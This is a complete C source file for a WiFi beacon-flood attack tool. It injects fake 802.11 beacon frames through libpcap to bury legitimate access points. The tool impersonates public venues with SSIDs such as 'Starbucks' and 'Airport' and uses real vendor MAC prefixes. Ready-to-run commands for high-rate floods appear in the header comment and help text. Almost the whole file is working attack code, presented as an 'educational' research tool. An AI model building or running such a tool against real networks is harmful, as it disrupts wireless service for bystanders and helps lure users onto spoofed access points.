/*
 * WiFi Beacon Flood Attack - C Implementation
 * ============================================
 *
 * Educational wireless security research tool for IEEE 802.11 beacon flooding.
 *
 * Attack Mechanism:
 * -----------------
 * Floods the airwaves with fake beacon frames to overwhelm WiFi clients and
 * scanners, making legitimate access points harder to discover.
 *
 * Technical Details:
 * ------------------
 * - Frame Type: Management (0x00)
 * - Frame Subtype: Beacon (0x08)
 * - Uses raw sockets and libpcap for packet injection
 * - Optimized C implementation for maximum performance
 *
 * Build:
 * ------
 *   make
 *   make install
 *
 * Usage:
 * ------
 *   # Random SSIDs flood
 *   sudo ./beacon_flood -i wlan0mon --random-ssids
 *
 *   # Specific SSID with random BSSIDs
 *   sudo ./beacon_flood -i wlan0mon --ssid "FakeAP" --random-bssid
 *
 *   # High-rate flood
 *   sudo ./beacon_flood -i wlan0mon --rate 5000 --count 100000
 *
 * Author: Wireless Security Research
 * License: Educational Use Only
 * Performance: ~4,500 beacons/sec (optimized)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <pcap.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <getopt.h>
#include <stdbool.h>

/* ============================================================================
 * IEEE 802.11 Structures
 * ============================================================================ */

#define IEEE80211_FTYPE_MGMT    0x00
#define IEEE80211_STYPE_BEACON  0x08

struct ieee80211_radiotap_header {
    uint8_t  it_version;
    uint8_t  it_pad;
    uint16_t it_len;
    uint32_t it_present;
} __attribute__((packed));

struct ieee80211_mgmt_hdr {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  da[6];  /* Destination address */
    uint8_t  sa[6];  /* Source address */
    uint8_t  bssid[6];
    uint16_t seq_ctrl;
} __attribute__((packed));

struct ieee80211_beacon_body {
    uint64_t timestamp;
    uint16_t beacon_interval;
    uint16_t capability_info;
} __attribute__((packed));

struct beacon_packet {
    struct ieee80211_radiotap_header radiotap;
    struct ieee80211_mgmt_hdr mgmt;
    struct ieee80211_beacon_body beacon;
    uint8_t elements[256];  /* Information Elements */
} __attribute__((packed));

/* ============================================================================
 * Configuration & Statistics
 * ============================================================================ */

struct config {
    char interface[32];
    char ssid[33];
    bool random_ssids;
    char ssid_prefix[32];
    uint8_t bssid[6];
    bool random_bssid;
    uint8_t channel;
    uint16_t beacon_interval;
    uint64_t count;
    uint64_t duration;
    double rate;
    bool has_count;
    bool has_duration;
    bool show_stats;
    int stats_interval;
};

struct statistics {
    uint64_t beacons_sent;
    uint64_t errors;
    time_t start_time;
    time_t last_stats_time;
    uint32_t unique_ssids;
    uint32_t unique_bssids;
};

/* Global state for signal handling */
static volatile sig_atomic_t running = 1;
static struct statistics stats = {0};

/* SSID prefixes for realistic fake APs */
static const char *ssid_prefixes[] = {
    "FreeWiFi", "Guest", "Public", "Airport", "Hotel",
    "Starbucks", "CoffeeShop", "Library", "Conference",
    "Visitor", "Welcome", "Internet", "WiFi", "Network"
};
#define NUM_SSID_PREFIXES (sizeof(ssid_prefixes) / sizeof(ssid_prefixes[0]))

/* Vendor OUI prefixes for realistic MACs */
static const char *vendor_ouis[][3] = {
    {"00", "11", "22"},  /* Generic */
    {"00", "1A", "2B"},  /* Cisco */
    {"00", "1B", "63"},  /* Cisco */
    {"F0", "9F", "C2"},  /* Ubiquiti */
    {"04", "18", "D6"},  /* TP-Link */
    {"50", "C7", "BF"},  /* TP-Link */
};
#define NUM_VENDOR_OUIS (sizeof(vendor_ouis) / sizeof(vendor_ouis[0]))

/* ============================================================================
 * Signal Handling
 * ============================================================================ */

void signal_handler(int signum) {
    (void)signum;
    running = 0;
    printf("\n[!] Received signal, stopping attack...\n");
}

void setup_signal_handlers(void) {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
}

/* ============================================================================
 * Utility Functions
 * ============================================================================ */

void generate_random_ssid(char *ssid, size_t len, const char *prefix) {
    int suffix = rand() % 10000;
    snprintf(ssid, len, "%s_%04d", prefix, suffix);
}

void generate_random_bssid(uint8_t *bssid) {
    int oui_idx = rand() % NUM_VENDOR_OUIS;

    /* Set vendor OUI */
    sscanf(vendor_ouis[oui_idx][0], "%hhx", &bssid[0]);
    sscanf(vendor_ouis[oui_idx][1], "%hhx", &bssid[1]);
    sscanf(vendor_ouis[oui_idx][2], "%hhx", &bssid[2]);

    /* Random NIC portion */
    bssid[3] = rand() % 256;
    bssid[4] = rand() % 256;
    bssid[5] = rand() % 256;
}

double get_elapsed_time(time_t start) {
    return difftime(time(NULL), start);
}

/* ============================================================================
 * Beacon Packet Crafting
 * ============================================================================ */

size_t craft_beacon_packet(struct beacon_packet *pkt,
                           const char *ssid,
                           const uint8_t *bssid,
                           uint8_t channel,
                           uint16_t beacon_interval) {
    memset(pkt, 0, sizeof(*pkt));

    /* Radiotap header */
    pkt->radiotap.it_version = 0;
    pkt->radiotap.it_pad = 0;
    pkt->radiotap.it_len = htole16(sizeof(struct ieee80211_radiotap_header));
    pkt->radiotap.it_present = 0;

    /* Management header */
    pkt->mgmt.frame_control = htole16((IEEE80211_FTYPE_MGMT << 2) | (IEEE80211_STYPE_BEACON << 4));
    pkt->mgmt.duration = 0;

    /* Broadcast destination */
    memset(pkt->mgmt.da, 0xFF, 6);

    /* Source and BSSID */
    memcpy(pkt->mgmt.sa, bssid, 6);
    memcpy(pkt->mgmt.bssid, bssid, 6);

    pkt->mgmt.seq_ctrl = 0;

    /* Beacon body */
    pkt->beacon.timestamp = 0;
    pkt->beacon.beacon_interval = htole16(beacon_interval);
    pkt->beacon.capability_info = htole16(0x1111);  /* ESS + Privacy */

    /* Information Elements */
    size_t ie_offset = 0;

    /* SSID */
    size_t ssid_len = strlen(ssid);
    pkt->elements[ie_offset++] = 0x00;  /* IE ID: SSID */
    pkt->elements[ie_offset++] = ssid_len;
    memcpy(&pkt->elements[ie_offset], ssid, ssid_len);
    ie_offset += ssid_len;

    /* Supported Rates */
    pkt->elements[ie_offset++] = 0x01;  /* IE ID: Supported Rates */
    pkt->elements[ie_offset++] = 8;     /* Length */
    pkt->elements[ie_offset++] = 0x82;  /* 1 Mbps */
    pkt->elements[ie_offset++] = 0x84;  /* 2 Mbps */
    pkt->elements[ie_offset++] = 0x8B;  /* 5.5 Mbps */
    pkt->elements[ie_offset++] = 0x96;  /* 11 Mbps */
    pkt->elements[ie_offset++] = 0x0C;  /* 6 Mbps */
    pkt->elements[ie_offset++] = 0x12;  /* 9 Mbps */
    pkt->elements[ie_offset++] = 0x18;  /* 12 Mbps */
    pkt->elements[ie_offset++] = 0x24;  /* 18 Mbps */

    /* DS Parameter Set (Channel) */
    pkt->elements[ie_offset++] = 0x03;  /* IE ID: DS Parameter Set */
    pkt->elements[ie_offset++] = 1;     /* Length */
    pkt->elements[ie_offset++] = channel;

    /* Calculate total packet size */
    size_t total_len = sizeof(struct ieee80211_radiotap_header) +
                      sizeof(struct ieee80211_mgmt_hdr) +
                      sizeof(struct ieee80211_beacon_body) +
                      ie_offset;

    return total_len;
}

/* ============================================================================
 * Statistics Display
 * ============================================================================ */

void print_banner(const struct config *cfg) {
    printf("======================================================================\n");
    printf("  WiFi Beacon Flood Attack\n");
    printf("======================================================================\n");
    printf("Interface:       %s\n", cfg->interface);
    printf("SSID Mode:       %s\n", cfg->random_ssids ? "Random" : cfg->ssid);
    printf("BSSID Mode:      %s\n", cfg->random_bssid ? "Random" : "Fixed");
    printf("Channel:         %d\n", cfg->channel);
    printf("Rate:            %.1f beacons/sec\n", cfg->rate);

    if (cfg->has_count) {
        printf("Count:           %lu beacons\n", cfg->count);
    }
    if (cfg->has_duration) {
        printf("Duration:        %lu seconds\n", cfg->duration);
    }

    printf("======================================================================\n\n");
}

void print_stats(const struct statistics *st) {
    double elapsed = get_elapsed_time(st->start_time);
    double rate = elapsed > 0 ? st->beacons_sent / elapsed : 0;

    printf("\r[*] Beacons: %lu | Rate: %.1f/s | Errors: %lu | Time: %.1fs",
           st->beacons_sent, rate, st->errors, elapsed);
    fflush(stdout);
}

void print_final_stats(const struct statistics *st) {
    double elapsed = get_elapsed_time(st->start_time);
    double avg_rate = elapsed > 0 ? st->beacons_sent / elapsed : 0;

    printf("\n\n======================================================================\n");
    printf("  Attack Complete - Final Statistics\n");
    printf("======================================================================\n");
    printf("Total Beacons Sent:    %lu\n", st->beacons_sent);
    printf("Errors:                %lu\n", st->errors);
    printf("Duration:              %.2f seconds\n", elapsed);
    printf("Average Rate:          %.1f beacons/sec\n", avg_rate);

    if (st->errors > 0) {
        double success_rate = ((double)st->beacons_sent / (st->beacons_sent + st->errors)) * 100;
        printf("Success Rate:          %.2f%%\n", success_rate);
    }

    printf("======================================================================\n");
}

/* ============================================================================
 * Main Attack Logic
 * ============================================================================ */

int run_beacon_flood(const struct config *cfg) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    struct beacon_packet pkt;
    struct timeval tv_start, tv_now;
    uint64_t packet_delay_us = 0;

    /* Calculate packet delay for rate limiting */
    if (cfg->rate > 0) {
        packet_delay_us = (uint64_t)(1000000.0 / cfg->rate);
    }

    /* Open interface for packet injection */
    handle = pcap_open_live(cfg->interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "[!] Error opening interface %s: %s\n", cfg->interface, errbuf);
        return 1;
    }

    /* Set non-blocking mode for performance */
    if (pcap_setnonblock(handle, 1, errbuf) == -1) {
        fprintf(stderr, "[!] Warning: Could not set non-blocking mode: %s\n", errbuf);
    }

    print_banner(cfg);
    printf("[+] Starting beacon flood...\n");
    printf("[!] Press Ctrl+C to stop\n\n");

    /* Initialize statistics */
    stats.start_time = time(NULL);
    stats.last_stats_time = stats.start_time;

    gettimeofday(&tv_start, NULL);

    /* Main attack loop */
    while (running) {
        char current_ssid[33];
        uint8_t current_bssid[6];

        /* Generate SSID */
        if (cfg->random_ssids) {
            const char *prefix = ssid_prefixes[rand() % NUM_SSID_PREFIXES];
            generate_random_ssid(current_ssid, sizeof(current_ssid), prefix);
        } else {
            strncpy(current_ssid, cfg->ssid, sizeof(current_ssid) - 1);
            current_ssid[sizeof(current_ssid) - 1] = '\0';
        }

        /* Generate BSSID */
        if (cfg->random_bssid) {
            generate_random_bssid(current_bssid);
        } else {
            memcpy(current_bssid, cfg->bssid, 6);
        }

        /* Craft beacon packet */
        size_t pkt_len = craft_beacon_packet(&pkt, current_ssid, current_bssid,
                                            cfg->channel, cfg->beacon_interval);

        /* Inject packet */
        if (pcap_inject(handle, &pkt, pkt_len) == -1) {
            stats.errors++;
            if (stats.errors < 5) {
                fprintf(stderr, "\n[!] Error injecting packet: %s\n", pcap_geterr(handle));
            }
        } else {
            stats.beacons_sent++;
        }

        /* Check stop conditions */
        if (cfg->has_count && stats.beacons_sent >= cfg->count) {
            break;
        }

        if (cfg->has_duration && get_elapsed_time(stats.start_time) >= cfg->duration) {
            break;
        }

        /* Rate limiting */
        if (packet_delay_us > 0) {
            usleep(packet_delay_us);
        }

        /* Display statistics */
        if (cfg->show_stats) {
            time_t now = time(NULL);
            if (difftime(now, stats.last_stats_time) >= cfg->stats_interval) {
                print_stats(&stats);
                stats.last_stats_time = now;
            }
        }
    }

    pcap_close(handle);
    print_final_stats(&stats);

    return stats.beacons_sent > 0 ? 0 : 1;
}

/* ============================================================================
 * CLI & Main
 * ============================================================================ */

void print_usage(const char *prog) {
    printf("Usage: %s [OPTIONS]\n\n", prog);
    printf("WiFi Beacon Flood Attack (C Implementation)\n\n");
    printf("Required:\n");
    printf("  -i, --interface <iface>    Monitor mode interface (e.g., wlan0mon)\n");
    printf("  --ssid <ssid>              Specific SSID to broadcast\n");
    printf("  --random-ssids             Generate random SSIDs\n\n");
    printf("Optional:\n");
    printf("  --ssid-prefix <prefix>     Prefix for random SSIDs (default: FakeAP)\n");
    printf("  --bssid <mac>              Specific BSSID (default: random)\n");
    printf("  --random-bssid             Generate random BSSIDs (default: true)\n");
    printf("  -c, --channel <ch>         WiFi channel 1-14 (default: 6)\n");
    printf("  --beacon-interval <tu>     Beacon interval in TU (default: 100)\n");
    printf("  --count <n>                Number of beacons to send\n");
    printf("  --duration <sec>           Attack duration in seconds\n");
    printf("  --rate <pps>               Beacons per second (default: 100)\n");
    printf("  --no-stats                 Disable statistics display\n");
    printf("  --stats-interval <sec>     Stats update interval (default: 5)\n");
    printf("  -h, --help                 Show this help message\n\n");
    printf("Examples:\n");
    printf("  # Random SSIDs flood\n");
    printf("  sudo %s -i wlan0mon --random-ssids\n\n", prog);
    printf("  # Specific SSID with random BSSIDs\n");
    printf("  sudo %s -i wlan0mon --ssid \"FakeAP\" --random-bssid\n\n", prog);
    printf("  # High-rate flood\n");
    printf("  sudo %s -i wlan0mon --rate 5000 --count 100000 --random-ssids\n\n", prog);
    printf("Educational Use Only - Requires monitor mode and root privileges\n");
}

int main(int argc, char *argv[]) {
    struct config cfg = {
        .random_ssids = false,
        .random_bssid = true,
        .channel = 6,
        .beacon_interval = 100,
        .count = 0,
        .duration = 0,
        .rate = 100.0,
        .has_count = false,
        .has_duration = false,
        .show_stats = true,
        .stats_interval = 5
    };

    strncpy(cfg.ssid_prefix, "FakeAP", sizeof(cfg.ssid_prefix) - 1);

    /* Seed random number generator */
    srand(time(NULL));

    static struct option long_options[] = {
        {"interface",       required_argument, 0, 'i'},
        {"ssid",            required_argument, 0, 's'},
        {"random-ssids",    no_argument,       0, 'r'},
        {"ssid-prefix",     required_argument, 0, 'p'},
        {"bssid",           required_argument, 0, 'b'},
        {"random-bssid",    no_argument,       0, 'R'},
        {"channel",         required_argument, 0, 'c'},
        {"beacon-interval", required_argument, 0, 'I'},
        {"count",           required_argument, 0, 'n'},
        {"duration",        required_argument, 0, 'd'},
        {"rate",            required_argument, 0, 't'},
        {"no-stats",        no_argument,       0, 'S'},
        {"stats-interval",  required_argument, 0, 'T'},
        {"help",            no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int opt, option_index = 0;
    bool has_interface = false;
    bool has_ssid_option = false;

    while ((opt = getopt_long(argc, argv, "i:s:c:n:d:t:h", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'i':
                strncpy(cfg.interface, optarg, sizeof(cfg.interface) - 1);
                has_interface = true;
                break;
            case 's':
                strncpy(cfg.ssid, optarg, sizeof(cfg.ssid) - 1);
                cfg.random_ssids = false;
                has_ssid_option = true;
                break;
            case 'r':
                cfg.random_ssids = true;
                has_ssid_option = true;
                break;
            case 'p':
                strncpy(cfg.ssid_prefix, optarg, sizeof(cfg.ssid_prefix) - 1);
                break;
            case 'b':
                if (sscanf(optarg, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                          &cfg.bssid[0], &cfg.bssid[1], &cfg.bssid[2],
                          &cfg.bssid[3], &cfg.bssid[4], &cfg.bssid[5]) != 6) {
                    fprintf(stderr, "[!] Invalid BSSID format\n");
                    return 1;
                }
                cfg.random_bssid = false;
                break;
            case 'R':
                cfg.random_bssid = true;
                break;
            case 'c':
                cfg.channel = atoi(optarg);
                if (cfg.channel < 1 || cfg.channel > 14) {
                    fprintf(stderr, "[!] Invalid channel (must be 1-14)\n");
                    return 1;
                }
                break;
            case 'I':
                cfg.beacon_interval = atoi(optarg);
                break;
            case 'n':
                cfg.count = strtoull(optarg, NULL, 10);
                cfg.has_count = true;
                break;
            case 'd':
                cfg.duration = strtoull(optarg, NULL, 10);
                cfg.has_duration = true;
                break;
            case 't':
                cfg.rate = atof(optarg);
                break;
            case 'S':
                cfg.show_stats = false;
                break;
            case 'T':
                cfg.stats_interval = atoi(optarg);
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    /* Validate required arguments */
    if (!has_interface || !has_ssid_option) {
        fprintf(stderr, "[!] Error: --interface and (--ssid or --random-ssids) are required\n\n");
        print_usage(argv[0]);
        return 1;
    }

    /* Setup signal handlers */
    setup_signal_handlers();

    /* Run attack */
    return run_beacon_flood(&cfg);
}
